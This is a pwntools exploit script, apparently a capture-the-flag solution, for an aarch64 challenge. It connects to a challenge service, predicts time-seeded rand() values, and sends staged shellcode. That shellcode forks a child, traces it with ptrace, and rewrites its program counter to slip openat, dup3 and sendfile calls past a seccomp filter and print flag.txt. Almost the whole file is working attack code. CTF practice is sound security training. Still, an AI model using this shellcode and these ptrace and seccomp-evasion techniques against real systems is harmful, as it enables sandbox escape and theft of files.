import ctypes
from pwn import *

context.arch = 'aarch64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

# p = gdb.debug('./chal', '''
#     set follow-fork-mode parent
#     set follow-exec-mode same
#     brva 0x1230
#     continue
# ''')

# p = process('./chal')

p = remote('host.docker.internal', 21000)

libc = ctypes.CDLL('/lib/aarch64-linux-gnu/libc.so.6')
libc.time.argtypes = [ctypes.POINTER(ctypes.c_long)]
libc.srand.argtypes = [ctypes.c_uint]
current_time = ctypes.c_long()
libc.time(ctypes.byref(current_time))
libc.srand(ctypes.c_uint(current_time.value))
libc.rand.restype = ctypes.c_int

SYS_dup3 = 0x18
SYS_openat = 0x38
SYS_sendfile = 0x47
SYS_ptrace = 0x75
SYS_clone = 0xdc
SYS_wait4 = 0x104

PTRACE_TRACEME = 0
PTRACE_CONT = 0x7
PTRACE_SYSCALL = 0x18
PTRACE_GETREGSET = 0x4204
PTRACE_SETREGSET = 0x4205

NT_PRSTATUS = 1
SIGCHLD = 17

AT_FDCWD = -100
O_RDONLY = 0

O_CLOEXEC = 0x80000

'''
root@874cc5491b97:/volume# grep -A5 "struct seccomp_data" /usr/include/linux/seccomp.h
struct seccomp_data {
        int nr;
        __u32 arch;
        __u64 instruction_pointer;
        __u64 args[6];
};
'''
fake_pc = libc.rand()|(libc.rand()<<32)

'''
root@cb1fe69a7a26:/volume# grep -r "struct user_pt_regs" /usr/include/
/usr/include/aarch64-linux-gnu/asm/ptrace.h:struct user_pt_regs {
'''
'''
root@cb1fe69a7a26:/volume# cat /usr/include/aarch64-linux-gnu/asm/ptrace.h | grep "struct user_pt_regs" -A 5
struct user_pt_regs {
        __u64           regs[31];
        __u64           sp;
        __u64           pc;
        __u64           pstate;
};
'''
user_pt_regs_size = 34*8
pc_offset = 32*8

'''
root@cb1fe69a7a26:/volume# grep -r "struct iovec" /usr/include/
/usr/include/linux/uio.h:struct iovec
'''
'''
root@cb1fe69a7a26:/volume# cat /usr/include/linux/uio.h | grep "iovec" -A 4
struct iovec
{
        void *iov_base; /* BSD uses caddr_t (1003.1g requires void *) */
        __kernel_size_t iov_len; /* Must be size_t (1003.1g) */
};
'''
iovec_size = 2*8

shellcode = asm(f'''
.org 0
parent_chunk_0:
    /* clone(SIGCHLD, 0, NULL, NULL, 0) */
    mov x8, {SYS_clone}
    mov x0, {SIGCHLD}
    eor x1, x1, x1
    eor x2, x2, x2
    eor x3, x3, x3
    eor x4, x4, x4
    svc #0
    cbz x0, child_chunk_0
    mov x19, x0
    /* wait4(child_pid, NULL, 0, NULL) */
    mov x8, {SYS_wait4}
    mov x0, x19
    eor x1, x1, x1
    eor x2, x2, x2
    eor x3, x3, x3
    svc #0
    b parent_chunk_1

.org 0x1000
parent_chunk_1:
    sub sp, sp, #{user_pt_regs_size+iovec_size}
    mov x20, sp
    add x21, sp, #{user_pt_regs_size}
    str x20, [x21, #0]
    mov x1, #{user_pt_regs_size}
    str x1, [x21, #8]
    b parent_chunk_2

.org 0x2000
parent_chunk_2:
    /* ptrace(PTRACE_GETREGSET, child_pid, NT_PRSTATUS, &iov) */
    mov x8, {SYS_ptrace}
    mov x0, {PTRACE_GETREGSET}
    mov x1, x19
    mov x2, {NT_PRSTATUS}
    mov x3, x21
    svc #0
    ldr x1, [x20, #{pc_offset}]
    add x1, x1, #4
    str x1, [x20, #{pc_offset}]
    /* ptrace(PTRACE_SETREGSET, child_pid, NT_PRSTATUS, &iov) */
    mov x8, {SYS_ptrace}
    mov x0, {PTRACE_SETREGSET}
    mov x1, x19
    mov x2, {NT_PRSTATUS}
    mov x3, x21
    svc #0
    b parent_chunk_3

.org 0x3000
parent_chunk_3:
    /* ptrace(PTRACE_SYSCALL, child_pid, 0, 0) */
    mov x8, {SYS_ptrace}
    mov x0, {PTRACE_SYSCALL}
    mov x1, x19
    eor x2, x2, x2
    eor x3, x3, x3
    svc #0
    /* wait4(child_pid, NULL, 0, NULL) */
    mov x8, {SYS_wait4}
    mov x0, x19
    eor x1, x1, x1
    eor x2, x2, x2
    eor x3, x3, x3
    svc #0
    b parent_chunk_4

.org 0x4000
parent_chunk_4:
    /* ptrace(PTRACE_GETREGSET, child_pid, NT_PRSTATUS, &iov) */
    mov x8, {SYS_ptrace}
    mov x0, {PTRACE_GETREGSET}
    mov x1, x19
    mov x2, {NT_PRSTATUS}
    mov x3, x21
    svc #0
    ldr x1, ={hex(fake_pc)}
    str x1, [x20, #{pc_offset}]
    /* ptrace(PTRACE_SETREGSET, child_pid, NT_PRSTATUS, &iov) */
    mov x8, {SYS_ptrace}
    mov x0, {PTRACE_SETREGSET}
    mov x1, x19
    mov x2, {NT_PRSTATUS}
    mov x3, x21
    svc #0
    b parent_chunk_5

.org 0x5000
parent_chunk_5:
    /* ptrace(PTRACE_CONT, child_pid, 0, 0) */
    mov x8, {SYS_ptrace}
    mov x0, {PTRACE_CONT}
    mov x1, x19
    eor x2, x2, x2
    eor x3, x3, x3
    svc #0
    /* wait4(child_pid, NULL, 0, NULL) */
    mov x8, {SYS_wait4}
    mov x0, x19
    eor x1, x1, x1
    eor x2, x2, x2
    eor x3, x3, x3
    svc #0
    b parent_chunk_6

.org 0x6000
parent_chunk_6:
    /* ptrace(PTRACE_GETREGSET, child_pid, NT_PRSTATUS, &iov) */
    mov x8, {SYS_ptrace}
    mov x0, {PTRACE_GETREGSET}
    mov x1, x19
    mov x2, {NT_PRSTATUS}
    mov x3, x21
    svc #0
    adr x1, dup3
    str x1, [x20, #{pc_offset}]
    /* ptrace(PTRACE_SETREGSET, child_pid, NT_PRSTATUS, &iov) */
    mov x8, {SYS_ptrace}
    mov x0, {PTRACE_SETREGSET}
    mov x1, x19
    mov x2, {NT_PRSTATUS}
    mov x3, x21
    svc #0
    b parent_chunk_7

.org 0x7000
parent_chunk_7:
    /* ptrace(PTRACE_SYSCALL, child_pid, 0, 0) */
    mov x8, {SYS_ptrace}
    mov x0, {PTRACE_SYSCALL}
    mov x1, x19
    eor x2, x2, x2
    eor x3, x3, x3
    svc #0
    /* wait4(child_pid, NULL, 0, NULL) */
    mov x8, {SYS_wait4}
    mov x0, x19
    eor x1, x1, x1
    eor x2, x2, x2
    eor x3, x3, x3
    svc #0
    b parent_chunk_8

.org 0x8000
parent_chunk_8:
    /* ptrace(PTRACE_GETREGSET, child_pid, NT_PRSTATUS, &iov) */
    mov x8, {SYS_ptrace}
    mov x0, {PTRACE_GETREGSET}
    mov x1, x19
    mov x2, {NT_PRSTATUS}
    mov x3, x21
    svc #0
    ldr x1, ={hex(fake_pc)}
    str x1, [x20, #{pc_offset}]
    /* ptrace(PTRACE_SETREGSET, child_pid, NT_PRSTATUS, &iov) */
    mov x8, {SYS_ptrace}
    mov x0, {PTRACE_SETREGSET}
    mov x1, x19
    mov x2, {NT_PRSTATUS}
    mov x3, x21
    svc #0
    b parent_chunk_9

.org 0x9000
parent_chunk_9:
    /* ptrace(PTRACE_CONT, child_pid, 0, 0) */
    mov x8, {SYS_ptrace}
    mov x0, {PTRACE_CONT}
    mov x1, x19
    eor x2, x2, x2
    eor x3, x3, x3
    svc #0
    /* wait4(child_pid, NULL, 0, NULL) */
    mov x8, {SYS_wait4}
    mov x0, x19
    eor x1, x1, x1
    eor x2, x2, x2
    eor x3, x3, x3
    svc #0
    b parent_chunk_10

.org 0xa000
parent_chunk_10:
    /* ptrace(PTRACE_GETREGSET, child_pid, NT_PRSTATUS, &iov) */
    mov x8, {SYS_ptrace}
    mov x0, {PTRACE_GETREGSET}
    mov x1, x19
    mov x2, {NT_PRSTATUS}
    mov x3, x21
    svc #0
    adr x1, sendfile
    str x1, [x20, #{pc_offset}]
    /* ptrace(PTRACE_SETREGSET, child_pid, NT_PRSTATUS, &iov) */
    mov x8, {SYS_ptrace}
    mov x0, {PTRACE_SETREGSET}
    mov x1, x19
    mov x2, {NT_PRSTATUS}
    mov x3, x21
    svc #0
    b parent_chunk_11

.org 0xb000
parent_chunk_11:
    /* ptrace(PTRACE_SYSCALL, child_pid, 0, 0) */
    mov x8, {SYS_ptrace}
    mov x0, {PTRACE_SYSCALL}
    mov x1, x19
    eor x2, x2, x2
    eor x3, x3, x3
    svc #0
    /* wait4(child_pid, NULL, 0, NULL) */
    mov x8, {SYS_wait4}
    mov x0, x19
    eor x1, x1, x1
    eor x2, x2, x2
    eor x3, x3, x3
    svc #0
    b parent_chunk_12

.org 0xc000
parent_chunk_12:
    /* ptrace(PTRACE_GETREGSET, child_pid, NT_PRSTATUS, &iov) */
    mov x8, {SYS_ptrace}
    mov x0, {PTRACE_GETREGSET}
    mov x1, x19
    mov x2, {NT_PRSTATUS}
    mov x3, x21
    svc #0
    ldr x1, ={hex(fake_pc)}
    str x1, [x20, #{pc_offset}]
    /* ptrace(PTRACE_SETREGSET, child_pid, NT_PRSTATUS, &iov) */
    mov x8, {SYS_ptrace}
    mov x0, {PTRACE_SETREGSET}
    mov x1, x19
    mov x2, {NT_PRSTATUS}
    mov x3, x21
    svc #0
    b parent_chunk_13

.org 0xd000
parent_chunk_13:
    /* ptrace(PTRACE_CONT, child_pid, 0, 0) */
    mov x8, {SYS_ptrace}
    mov x0, {PTRACE_CONT}
    mov x1, x19
    eor x2, x2, x2
    eor x3, x3, x3
    svc #0
    /* wait4(child_pid, NULL, 0, NULL) */
    mov x8, {SYS_wait4}
    mov x0, x19
    eor x1, x1, x1
    eor x2, x2, x2
    eor x3, x3, x3
    svc #0
    hlt #0

.org 0xe000
child_chunk_0:
    /* ptrace(PTRACE_TRACEME, 0, 0, 0) */
    mov x8, {SYS_ptrace}
    mov x0, {PTRACE_TRACEME}
    eor x1, x1, x1
    eor x2, x2, x2
    eor x3, x3, x3
    svc #0
    brk #0
    openat:
        /* openat(AT_FDCWD, "flag.txt", O_RDONLY, 0) */
        mov x8, {SYS_openat}
        mov x0, {AT_FDCWD}
        adr x1, flag
        mov x2, {O_RDONLY}
        eor x3, x3, x3
        svc #0
    b child_chunk_1

.org 0xf000
child_chunk_1:
    dup3:
        /* dup3(3, 0x1337, O_CLOEXEC) */
        mov x8, {SYS_dup3}
        mov x1, #0x1337
        mov x2, {O_CLOEXEC}
        svc #0
    sendfile:
        /* sendfile(1, 0x1337, NULL, 0x80) */
        mov x8, {SYS_sendfile}
        mov x0, #1
        eor x2, x2, x2
        mov x3, #0x80
        svc #0
    hlt #0
    flag:
        .string "flag.txt"
''')

for i in range(16):
    p.sendafter(b"Piece %d: " % (i + 1), shellcode[i*0x1000:i*0x1000+0x40])

p.sendlineafter(b">> ", b'3')

p.interactive()